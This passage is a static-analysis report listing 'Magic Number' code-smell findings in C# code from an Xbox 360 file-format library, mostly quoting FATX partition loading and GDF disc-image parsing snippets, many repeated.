else  			name = "Content";  		FATXPartition x = new FATXPartition ((off * SectorSize)' (len * SectorSize)' this' name);  		if (x.IsValid)  			xPartitions.Add (x);  	}  }  
Magic Number,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,LoadPartitions,The following statement contains a magic number: if (xType == DriveTypes.HardDrive) {  	/*FATXPartition x = new FATXPartition((long)HDD.Partition1' (long)HDD.Partition2 - (long)HDD.Partition1' this' current);                 if (x.IsValid)                 {                     xPartitions.Add(x); // Unknown                     current++;                 }                 x = new FATXPartition((long)HDD.Partition2' (long)HDD.Partition3 - (long)HDD.Partition2' this' current);                 if (x.IsValid)                 {                     xPartitions.Add(x); // Unknown                     current++;                 }*/FATXPartition x = new FATXPartition ((long)HDD.Partition3' (long)HDD.Partition4 - (long)HDD.Partition3' this' "System");  	if (x.IsValid)  		xPartitions.Add (x);  	// Unknown  	x = new FATXPartition ((long)HDD.Partition4' (long)HDD.Partition5 - (long)HDD.Partition4' this' "Compatability");  	// Compatability  	if (x.IsValid)  		xPartitions.Add (x);  	// Compatability  	x = new FATXPartition ((long)HDD.Partition5' xIO.Length - (long)HDD.Partition5' this' "Content");  	if (x.IsValid)  		xPartitions.Add (x);  	// Main Partition  }  else if (xType == DriveTypes.MemoryUnit) {  	FATXPartition x = new FATXPartition ((long)MU.Partition1' (long)MU.Partition2 - (long)MU.Partition1' this' "Cache");  	if (x.IsValid)  		xPartitions.Add (x);  	x = new FATXPartition ((long)MU.Partition2' xIO.Length - (long)MU.Partition2' this' "Content");  	if (x.IsValid)  		xPartitions.Add (x);  }  else if (xType == DriveTypes.USBFlashDrive) {  	// Dunno why there's space between o.o  	FATXPartition x = new FATXPartition ((long)USB.Partition1' 0x47FF000' this' "Cache");  	if (x.IsValid)  		xPartitions.Add (x);  	x = new FATXPartition ((long)USB.Partition2' xIO.Length - (long)USB.Partition2' this' "Content");  	if (x.IsValid)  		xPartitions.Add (x);  }  else {  	for (int i = 0; i < 3; i++) {  		xIO.Position = (8 + (i * 8));  		uint off = xIO.ReadUInt32 ();  		uint len = xIO.ReadUInt32 ();  		if (off == 0 || len == 0)  			break;  		string name = "Partition" + i.ToString ();  		if (i == 0)  			name = "System";  		else if (i == 2)  			name = "Compatability";  		else  			name = "Content";  		FATXPartition x = new FATXPartition ((off * SectorSize)' (len * SectorSize)' this' name);  		if (x.IsValid)  			xPartitions.Add (x);  	}  }  
Magic Number,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,LoadPartitions,The following statement contains a magic number: if (xType == DriveTypes.HardDrive) {  	/*FATXPartition x = new FATXPartition((long)HDD.Partition1' (long)HDD.Partition2 - (long)HDD.Partition1' this' current);                 if (x.IsValid)                 {                     xPartitions.Add(x); // Unknown                     current++;                 }                 x = new FATXPartition((long)HDD.Partition2' (long)HDD.Partition3 - (long)HDD.Partition2' this' current);                 if (x.IsValid)                 {                     xPartitions.Add(x); // Unknown                     current++;                 }*/FATXPartition x = new FATXPartition ((long)HDD.Partition3' (long)HDD.Partition4 - (long)HDD.Partition3' this' "System");  	if (x.IsValid)  		xPartitions.Add (x);  	// Unknown  	x = new FATXPartition ((long)HDD.Partition4' (long)HDD.Partition5 - (long)HDD.Partition4' this' "Compatability");  	// Compatability  	if (x.IsValid)  		xPartitions.Add (x);  	// Compatability  	x = new FATXPartition ((long)HDD.Partition5' xIO.Length - (long)HDD.Partition5' this' "Content");  	if (x.IsValid)  		xPartitions.Add (x);  	// Main Partition  }  else if (xType == DriveTypes.MemoryUnit) {  	FATXPartition x = new FATXPartition ((long)MU.Partition1' (long)MU.Partition2 - (long)MU.Partition1' this' "Cache");  	if (x.IsValid)  		xPartitions.Add (x);  	x = new FATXPartition ((long)MU.Partition2' xIO.Length - (long)MU.Partition2' this' "Content");  	if (x.IsValid)  		xPartitions.Add (x);  }  else if (xType == DriveTypes.USBFlashDrive) {  	// Dunno why there's space between o.o  	FATXPartition x = new FATXPartition ((long)USB.Partition1' 0x47FF000' this' "Cache");  	if (x.IsValid)  		xPartitions.Add (x);  	x = new FATXPartition ((long)USB.Partition2' xIO.Length - (long)USB.Partition2' this' "Content");  	if (x.IsValid)  		xPartitions.Add (x);  }  else {  	for (int i = 0; i < 3; i++) {  		xIO.Position = (8 + (i * 8));  		uint off = xIO.ReadUInt32 ();  		uint len = xIO.ReadUInt32 ();  		if (off == 0 || len == 0)  			break;  		string name = "Partition" + i.ToString ();  		if (i == 0)  			name = "System";  		else if (i == 2)  			name = "Compatability";  		else  			name = "Content";  		FATXPartition x = new FATXPartition ((off * SectorSize)' (len * SectorSize)' this' name);  		if (x.IsValid)  			xPartitions.Add (x);  	}  }  
Magic Number,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,LoadPartitions,The following statement contains a magic number: if (xType == DriveTypes.HardDrive) {  	/*FATXPartition x = new FATXPartition((long)HDD.Partition1' (long)HDD.Partition2 - (long)HDD.Partition1' this' current);                 if (x.IsValid)                 {                     xPartitions.Add(x); // Unknown                     current++;                 }                 x = new FATXPartition((long)HDD.Partition2' (long)HDD.Partition3 - (long)HDD.Partition2' this' current);                 if (x.IsValid)                 {                     xPartitions.Add(x); // Unknown                     current++;                 }*/FATXPartition x = new FATXPartition ((long)HDD.Partition3' (long)HDD.Partition4 - (long)HDD.Partition3' this' "System");  	if (x.IsValid)  		xPartitions.Add (x);  	// Unknown  	x = new FATXPartition ((long)HDD.Partition4' (long)HDD.Partition5 - (long)HDD.Partition4' this' "Compatability");  	// Compatability  	if (x.IsValid)  		xPartitions.Add (x);  	// Compatability  	x = new FATXPartition ((long)HDD.Partition5' xIO.Length - (long)HDD.Partition5' this' "Content");  	if (x.IsValid)  		xPartitions.Add (x);  	// Main Partition  }  else if (xType == DriveTypes.MemoryUnit) {  	FATXPartition x = new FATXPartition ((long)MU.Partition1' (long)MU.Partition2 - (long)MU.Partition1' this' "Cache");  	if (x.IsValid)  		xPartitions.Add (x);  	x = new FATXPartition ((long)MU.Partition2' xIO.Length - (long)MU.Partition2' this' "Content");  	if (x.IsValid)  		xPartitions.Add (x);  }  else if (xType == DriveTypes.USBFlashDrive) {  	// Dunno why there's space between o.o  	FATXPartition x = new FATXPartition ((long)USB.Partition1' 0x47FF000' this' "Cache");  	if (x.IsValid)  		xPartitions.Add (x);  	x = new FATXPartition ((long)USB.Partition2' xIO.Length - (long)USB.Partition2' this' "Content");  	if (x.IsValid)  		xPartitions.Add (x);  }  else {  	for (int i = 0; i < 3; i++) {  		xIO.Position = (8 + (i * 8));  		uint off = xIO.ReadUInt32 ();  		uint len = xIO.ReadUInt32 ();  		if (off == 0 || len == 0)  			break;  		string name = "Partition" + i.ToString ();  		if (i == 0)  			name = "System";  		else if (i == 2)  			name = "Compatability";  		else  			name = "Content";  		FATXPartition x = new FATXPartition ((off * SectorSize)' (len * SectorSize)' this' name);  		if (x.IsValid)  			xPartitions.Add (x);  	}  }  
Magic Number,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,LoadPartitions,The following statement contains a magic number: if (xType == DriveTypes.MemoryUnit) {  	FATXPartition x = new FATXPartition ((long)MU.Partition1' (long)MU.Partition2 - (long)MU.Partition1' this' "Cache");  	if (x.IsValid)  		xPartitions.Add (x);  	x = new FATXPartition ((long)MU.Partition2' xIO.Length - (long)MU.Partition2' this' "Content");  	if (x.IsValid)  		xPartitions.Add (x);  }  else if (xType == DriveTypes.USBFlashDrive) {  	// Dunno why there's space between o.o  	FATXPartition x = new FATXPartition ((long)USB.Partition1' 0x47FF000' this' "Cache");  	if (x.IsValid)  		xPartitions.Add (x);  	x = new FATXPartition ((long)USB.Partition2' xIO.Length - (long)USB.Partition2' this' "Content");  	if (x.IsValid)  		xPartitions.Add (x);  }  else {  	for (int i = 0; i < 3; i++) {  		xIO.Position = (8 + (i * 8));  		uint off = xIO.ReadUInt32 ();  		uint len = xIO.ReadUInt32 ();  		if (off == 0 || len == 0)  			break;  		string name = "Partition" + i.ToString ();  		if (i == 0)  			name = "System";  		else if (i == 2)  			name = "Compatability";  		else  			name = "Content";  		FATXPartition x = new FATXPartition ((off * SectorSize)' (len * SectorSize)' this' name);  		if (x.IsValid)  			xPartitions.Add (x);  	}  }  
Magic Number,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,LoadPartitions,The following statement contains a magic number: if (xType == DriveTypes.MemoryUnit) {  	FATXPartition x = new FATXPartition ((long)MU.Partition1' (long)MU.Partition2 - (long)MU.Partition1' this' "Cache");  	if (x.IsValid)  		xPartitions.Add (x);  	x = new FATXPartition ((long)MU.Partition2' xIO.Length - (long)MU.Partition2' this' "Content");  	if (x.IsValid)  		xPartitions.Add (x);  }  else if (xType == DriveTypes.USBFlashDrive) {  	// Dunno why there's space between o.o  	FATXPartition x = new FATXPartition ((long)USB.Partition1' 0x47FF000' this' "Cache");  	if (x.IsValid)  		xPartitions.Add (x);  	x = new FATXPartition ((long)USB.Partition2' xIO.Length - (long)USB.Partition2' this' "Content");  	if (x.IsValid)  		xPartitions.Add (x);  }  else {  	for (int i = 0; i < 3; i++) {  		xIO.Position = (8 + (i * 8));  		uint off = xIO.ReadUInt32 ();  		uint len = xIO.ReadUInt32 ();  		if (off == 0 || len == 0)  			break;  		string name = "Partition" + i.ToString ();  		if (i == 0)  			name = "System";  		else if (i == 2)  			name = "Compatability";  		else  			name = "Content";  		FATXPartition x = new FATXPartition ((off * SectorSize)' (len * SectorSize)' this' name);  		if (x.IsValid)  			xPartitions.Add (x);  	}  }  
Magic Number,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,LoadPartitions,The following statement contains a magic number: if (xType == DriveTypes.MemoryUnit) {  	FATXPartition x = new FATXPartition ((long)MU.Partition1' (long)MU.Partition2 - (long)MU.Partition1' this' "Cache");  	if (x.IsValid)  		xPartitions.Add (x);  	x = new FATXPartition ((long)MU.Partition2' xIO.Length - (long)MU.Partition2' this' "Content");  	if (x.IsValid)  		xPartitions.Add (x);  }  else if (xType == DriveTypes.USBFlashDrive) {  	// Dunno why there's space between o.o  	FATXPartition x = new FATXPartition ((long)USB.Partition1' 0x47FF000' this' "Cache");  	if (x.IsValid)  		xPartitions.Add (x);  	x = new FATXPartition ((long)USB.Partition2' xIO.Length - (long)USB.Partition2' this' "Content");  	if (x.IsValid)  		xPartitions.Add (x);  }  else {  	for (int i = 0; i < 3; i++) {  		xIO.Position = (8 + (i * 8));  		uint off = xIO.ReadUInt32 ();  		uint len = xIO.ReadUInt32 ();  		if (off == 0 || len == 0)  			break;  		string name = "Partition" + i.ToString ();  		if (i == 0)  			name = "System";  		else if (i == 2)  			name = "Compatability";  		else  			name = "Content";  		FATXPartition x = new FATXPartition ((off * SectorSize)' (len * SectorSize)' this' name);  		if (x.IsValid)  			xPartitions.Add (x);  	}  }  
Magic Number,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,LoadPartitions,The following statement contains a magic number: if (xType == DriveTypes.MemoryUnit) {  	FATXPartition x = new FATXPartition ((long)MU.Partition1' (long)MU.Partition2 - (long)MU.Partition1' this' "Cache");  	if (x.IsValid)  		xPartitions.Add (x);  	x = new FATXPartition ((long)MU.Partition2' xIO.Length - (long)MU.Partition2' this' "Content");  	if (x.IsValid)  		xPartitions.Add (x);  }  else if (xType == DriveTypes.USBFlashDrive) {  	// Dunno why there's space between o.o  	FATXPartition x = new FATXPartition ((long)USB.Partition1' 0x47FF000' this' "Cache");  	if (x.IsValid)  		xPartitions.Add (x);  	x = new FATXPartition ((long)USB.Partition2' xIO.Length - (long)USB.Partition2' this' "Content");  	if (x.IsValid)  		xPartitions.Add (x);  }  else {  	for (int i = 0; i < 3; i++) {  		xIO.Position = (8 + (i * 8));  		uint off = xIO.ReadUInt32 ();  		uint len = xIO.ReadUInt32 ();  		if (off == 0 || len == 0)  			break;  		string name = "Partition" + i.ToString ();  		if (i == 0)  			name = "System";  		else if (i == 2)  			name = "Compatability";  		else  			name = "Content";  		FATXPartition x = new FATXPartition ((off * SectorSize)' (len * SectorSize)' this' name);  		if (x.IsValid)  			xPartitions.Add (x);  	}  }  
Magic Number,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,LoadPartitions,The following statement contains a magic number: if (xType == DriveTypes.USBFlashDrive) {  	// Dunno why there's space between o.o  	FATXPartition x = new FATXPartition ((long)USB.Partition1' 0x47FF000' this' "Cache");  	if (x.IsValid)  		xPartitions.Add (x);  	x = new FATXPartition ((long)USB.Partition2' xIO.Length - (long)USB.Partition2' this' "Content");  	if (x.IsValid)  		xPartitions.Add (x);  }  else {  	for (int i = 0; i < 3; i++) {  		xIO.Position = (8 + (i * 8));  		uint off = xIO.ReadUInt32 ();  		uint len = xIO.ReadUInt32 ();  		if (off == 0 || len == 0)  			break;  		string name = "Partition" + i.ToString ();  		if (i == 0)  			name = "System";  		else if (i == 2)  			name = "Compatability";  		else  			name = "Content";  		FATXPartition x = new FATXPartition ((off * SectorSize)' (len * SectorSize)' this' name);  		if (x.IsValid)  			xPartitions.Add (x);  	}  }  
Magic Number,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,LoadPartitions,The following statement contains a magic number: if (xType == DriveTypes.USBFlashDrive) {  	// Dunno why there's space between o.o  	FATXPartition x = new FATXPartition ((long)USB.Partition1' 0x47FF000' this' "Cache");  	if (x.IsValid)  		xPartitions.Add (x);  	x = new FATXPartition ((long)USB.Partition2' xIO.Length - (long)USB.Partition2' this' "Content");  	if (x.IsValid)  		xPartitions.Add (x);  }  else {  	for (int i = 0; i < 3; i++) {  		xIO.Position = (8 + (i * 8));  		uint off = xIO.ReadUInt32 ();  		uint len = xIO.ReadUInt32 ();  		if (off == 0 || len == 0)  			break;  		string name = "Partition" + i.ToString ();  		if (i == 0)  			name = "System";  		else if (i == 2)  			name = "Compatability";  		else  			name = "Content";  		FATXPartition x = new FATXPartition ((off * SectorSize)' (len * SectorSize)' this' name);  		if (x.IsValid)  			xPartitions.Add (x);  	}  }  
Magic Number,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,LoadPartitions,The following statement contains a magic number: if (xType == DriveTypes.USBFlashDrive) {  	// Dunno why there's space between o.o  	FATXPartition x = new FATXPartition ((long)USB.Partition1' 0x47FF000' this' "Cache");  	if (x.IsValid)  		xPartitions.Add (x);  	x = new FATXPartition ((long)USB.Partition2' xIO.Length - (long)USB.Partition2' this' "Content");  	if (x.IsValid)  		xPartitions.Add (x);  }  else {  	for (int i = 0; i < 3; i++) {  		xIO.Position = (8 + (i * 8));  		uint off = xIO.ReadUInt32 ();  		uint len = xIO.ReadUInt32 ();  		if (off == 0 || len == 0)  			break;  		string name = "Partition" + i.ToString ();  		if (i == 0)  			name = "System";  		else if (i == 2)  			name = "Compatability";  		else  			name = "Content";  		FATXPartition x = new FATXPartition ((off * SectorSize)' (len * SectorSize)' this' name);  		if (x.IsValid)  			xPartitions.Add (x);  	}  }  
Magic Number,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,LoadPartitions,The following statement contains a magic number: if (xType == DriveTypes.USBFlashDrive) {  	// Dunno why there's space between o.o  	FATXPartition x = new FATXPartition ((long)USB.Partition1' 0x47FF000' this' "Cache");  	if (x.IsValid)  		xPartitions.Add (x);  	x = new FATXPartition ((long)USB.Partition2' xIO.Length - (long)USB.Partition2' this' "Content");  	if (x.IsValid)  		xPartitions.Add (x);  }  else {  	for (int i = 0; i < 3; i++) {  		xIO.Position = (8 + (i * 8));  		uint off = xIO.ReadUInt32 ();  		uint len = xIO.ReadUInt32 ();  		if (off == 0 || len == 0)  			break;  		string name = "Partition" + i.ToString ();  		if (i == 0)  			name = "System";  		else if (i == 2)  			name = "Compatability";  		else  			name = "Content";  		FATXPartition x = new FATXPartition ((off * SectorSize)' (len * SectorSize)' this' name);  		if (x.IsValid)  			xPartitions.Add (x);  	}  }  
Magic Number,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,LoadPartitions,The following statement contains a magic number: for (int i = 0; i < 3; i++) {  	xIO.Position = (8 + (i * 8));  	uint off = xIO.ReadUInt32 ();  	uint len = xIO.ReadUInt32 ();  	if (off == 0 || len == 0)  		break;  	string name = "Partition" + i.ToString ();  	if (i == 0)  		name = "System";  	else if (i == 2)  		name = "Compatability";  	else  		name = "Content";  	FATXPartition x = new FATXPartition ((off * SectorSize)' (len * SectorSize)' this' name);  	if (x.IsValid)  		xPartitions.Add (x);  }  
Magic Number,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,LoadPartitions,The following statement contains a magic number: for (int i = 0; i < 3; i++) {  	xIO.Position = (8 + (i * 8));  	uint off = xIO.ReadUInt32 ();  	uint len = xIO.ReadUInt32 ();  	if (off == 0 || len == 0)  		break;  	string name = "Partition" + i.ToString ();  	if (i == 0)  		name = "System";  	else if (i == 2)  		name = "Compatability";  	else  		name = "Content";  	FATXPartition x = new FATXPartition ((off * SectorSize)' (len * SectorSize)' this' name);  	if (x.IsValid)  		xPartitions.Add (x);  }  
Magic Number,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,LoadPartitions,The following statement contains a magic number: for (int i = 0; i < 3; i++) {  	xIO.Position = (8 + (i * 8));  	uint off = xIO.ReadUInt32 ();  	uint len = xIO.ReadUInt32 ();  	if (off == 0 || len == 0)  		break;  	string name = "Partition" + i.ToString ();  	if (i == 0)  		name = "System";  	else if (i == 2)  		name = "Compatability";  	else  		name = "Content";  	FATXPartition x = new FATXPartition ((off * SectorSize)' (len * SectorSize)' this' name);  	if (x.IsValid)  		xPartitions.Add (x);  }  
Magic Number,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,LoadPartitions,The following statement contains a magic number: for (int i = 0; i < 3; i++) {  	xIO.Position = (8 + (i * 8));  	uint off = xIO.ReadUInt32 ();  	uint len = xIO.ReadUInt32 ();  	if (off == 0 || len == 0)  		break;  	string name = "Partition" + i.ToString ();  	if (i == 0)  		name = "System";  	else if (i == 2)  		name = "Compatability";  	else  		name = "Content";  	FATXPartition x = new FATXPartition ((off * SectorSize)' (len * SectorSize)' this' name);  	if (x.IsValid)  		xPartitions.Add (x);  }  
Magic Number,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,LoadPartitions,The following statement contains a magic number: xIO.Position = (8 + (i * 8));  
Magic Number,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,LoadPartitions,The following statement contains a magic number: xIO.Position = (8 + (i * 8));  
Magic Number,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,LoadPartitions,The following statement contains a magic number: if (i == 0)  	name = "System";  else if (i == 2)  	name = "Compatability";  else  	name = "Content";  
Magic Number,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,LoadPartitions,The following statement contains a magic number: if (i == 2)  	name = "Compatability";  else  	name = "Content";  
Magic Number,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,GetIO,The following statement contains a magic number: if (IsDriveIO && xType != DriveTypes.USBFlashDrive) {  	// Close previous handle  	if (xIO != null) {  		xIO.Close ();  		// Make a new handle to a drive  		xIO.OpenAgain ();  	}  	else  		xIO = new DriveIO (ref xDrive' true);  }  else if (xType == DriveTypes.USBFlashDrive && xIO == null || !xIO.Accessed) {  	List<string> files = new List<string> ();  	for (int i = 0; i <= 9999; i++) {  		string file = xDrive.DeviceName + @"\Xbox360\Data" + i.ToString ("000#");  		if (File.Exists (file))  			files.Add (file);  		else  			break;  	}  	xIO = new MultiFileIO (files.ToArray ()' true);  }  
Magic Number,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,GetIO,The following statement contains a magic number: if (xType == DriveTypes.USBFlashDrive && xIO == null || !xIO.Accessed) {  	List<string> files = new List<string> ();  	for (int i = 0; i <= 9999; i++) {  		string file = xDrive.DeviceName + @"\Xbox360\Data" + i.ToString ("000#");  		if (File.Exists (file))  			files.Add (file);  		else  			break;  	}  	xIO = new MultiFileIO (files.ToArray ()' true);  }  
Magic Number,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,GetIO,The following statement contains a magic number: for (int i = 0; i <= 9999; i++) {  	string file = xDrive.DeviceName + @"\Xbox360\Data" + i.ToString ("000#");  	if (File.Exists (file))  		files.Add (file);  	else  		break;  }  
Magic Number,X360.GDFX,GDFFile,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,xInject,The following statement contains a magic number: try {  	if (xIO.Length == 0)  		return true;  	xIO.Position = 0;  	xref.xIO.Position = xref.GenerateDataOffset (xStartBlock);  	int ct = (int)(((xIO.Length - 1) / GDFImage.blocksize) + 1);  	for (int i = 0; i < ct; i++) {  		if (i < (ct - 1))  			xref.xIO.Write (xIO.ReadBytes (GDFImage.blocksize));  		else  			xref.xIO.Write (xIO.ReadBytes ((int)(((xIO.Length - 1) % GDFImage.blocksize) + 1)));  	}  	xref.xIO.Position = (entryoffset + 4);  	xref.xIO.Write ((int)xIO.Length' false);  	xref.xIO.Flush ();  	return true;  }  catch {  	return false;  }  
Magic Number,X360.GDFX,GDFFile,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,xInject,The following statement contains a magic number: xref.xIO.Position = (entryoffset + 4);  
Magic Number,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,GDFImage,The following statement contains a magic number: if (xIOIn.ReadUInt32 () == (uint)AllMagic.XSF) {  	xIOIn.Position = baseoffset = 0x10000;  	if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ())  		throw GDFExceptions.NotGDF;  }  else {  	xIOIn.Position = baseoffset = 0;  	if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ()) {  		if (xIOIn.Length < 0x1FB20)  			throw GDFExceptions.NotGDF;  		xIOIn.Position = baseoffset = 0x1FB20;  		if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ()) {  			if (xIOIn.Length < 0x30600)  				throw GDFExceptions.NotGDF;  			xIOIn.Position = baseoffset = 0x30600;  			if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ()) {  				if (xIO.Length < 0xFDA0000)  					throw GDFExceptions.NotGDF;  				xIOIn.Position = baseoffset = 0xFDA0000;  				if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ())  					throw GDFExceptions.NotGDF;  			}  		}  	}  }  
Magic Number,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,GDFImage,The following statement contains a magic number: if (xIOIn.ReadUInt32 () == (uint)AllMagic.XSF) {  	xIOIn.Position = baseoffset = 0x10000;  	if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ())  		throw GDFExceptions.NotGDF;  }  else {  	xIOIn.Position = baseoffset = 0;  	if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ()) {  		if (xIOIn.Length < 0x1FB20)  			throw GDFExceptions.NotGDF;  		xIOIn.Position = baseoffset = 0x1FB20;  		if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ()) {  			if (xIOIn.Length < 0x30600)  				throw GDFExceptions.NotGDF;  			xIOIn.Position = baseoffset = 0x30600;  			if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ()) {  				if (xIO.Length < 0xFDA0000)  					throw GDFExceptions.NotGDF;  				xIOIn.Position = baseoffset = 0xFDA0000;  				if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ())  					throw GDFExceptions.NotGDF;  			}  		}  	}  }  
Magic Number,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,GDFImage,The following statement contains a magic number: if (xIOIn.ReadUInt32 () == (uint)AllMagic.XSF) {  	xIOIn.Position = baseoffset = 0x10000;  	if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ())  		throw GDFExceptions.NotGDF;  }  else {  	xIOIn.Position = baseoffset = 0;  	if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ()) {  		if (xIOIn.Length < 0x1FB20)  			throw GDFExceptions.NotGDF;  		xIOIn.Position = baseoffset = 0x1FB20;  		if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ()) {  			if (xIOIn.Length < 0x30600)  				throw GDFExceptions.NotGDF;  			xIOIn.Position = baseoffset = 0x30600;  			if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ()) {  				if (xIO.Length < 0xFDA0000)  					throw GDFExceptions.NotGDF;  				xIOIn.Position = baseoffset = 0xFDA0000;  				if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ())  					throw GDFExceptions.NotGDF;  			}  		}  	}  }  
Magic Number,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,GDFImage,The following statement contains a magic number: if (xIOIn.ReadUInt32 () == (uint)AllMagic.XSF) {  	xIOIn.Position = baseoffset = 0x10000;  	if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ())  		throw GDFExceptions.NotGDF;  }  else {  	xIOIn.Position = baseoffset = 0;  	if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ()) {  		if (xIOIn.Length < 0x1FB20)  			throw GDFExceptions.NotGDF;  		xIOIn.Position = baseoffset = 0x1FB20;  		if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ()) {  			if (xIOIn.Length < 0x30600)  				throw GDFExceptions.NotGDF;  			xIOIn.Position = baseoffset = 0x30600;  			if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ()) {  				if (xIO.Length < 0xFDA0000)  					throw GDFExceptions.NotGDF;  				xIOIn.Position = baseoffset = 0xFDA0000;  				if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ())  					throw GDFExceptions.NotGDF;  			}  		}  	}  }  
Magic Number,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,GDFImage,The following statement contains a magic number: if (xIOIn.ReadUInt32 () == (uint)AllMagic.XSF) {  	xIOIn.Position = baseoffset = 0x10000;  	if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ())  		throw GDFExceptions.NotGDF;  }  else {  	xIOIn.Position = baseoffset = 0;  	if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ()) {  		if (xIOIn.Length < 0x1FB20)  			throw GDFExceptions.NotGDF;  		xIOIn.Position = baseoffset = 0x1FB20;  		if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ()) {  			if (xIOIn.Length < 0x30600)  				throw GDFExceptions.NotGDF;  			xIOIn.Position = baseoffset = 0x30600;  			if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ()) {  				if (xIO.Length < 0xFDA0000)  					throw GDFExceptions.NotGDF;  				xIOIn.Position = baseoffset = 0xFDA0000;  				if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ())  					throw GDFExceptions.NotGDF;  			}  		}  	}  }  
Magic Number,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,GDFImage,The following statement contains a magic number: if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ())  	throw GDFExceptions.NotGDF;  
Magic Number,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,GDFImage,The following statement contains a magic number: if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ()) {  	if (xIOIn.Length < 0x1FB20)  		throw GDFExceptions.NotGDF;  	xIOIn.Position = baseoffset = 0x1FB20;  	if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ()) {  		if (xIOIn.Length < 0x30600)  			throw GDFExceptions.NotGDF;  		xIOIn.Position = baseoffset = 0x30600;  		if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ()) {  			if (xIO.Length < 0xFDA0000)  				throw GDFExceptions.NotGDF;  			xIOIn.Position = baseoffset = 0xFDA0000;  			if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ())  				throw GDFExceptions.NotGDF;  		}  	}  }  
Magic Number,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,GDFImage,The following statement contains a magic number: if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ()) {  	if (xIOIn.Length < 0x1FB20)  		throw GDFExceptions.NotGDF;  	xIOIn.Position = baseoffset = 0x1FB20;  	if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ()) {  		if (xIOIn.Length < 0x30600)  			throw GDFExceptions.NotGDF;  		xIOIn.Position = baseoffset = 0x30600;  		if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ()) {  			if (xIO.Length < 0xFDA0000)  				throw GDFExceptions.NotGDF;  			xIOIn.Position = baseoffset = 0xFDA0000;  			if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ())  				throw GDFExceptions.NotGDF;  		}  	}  }  
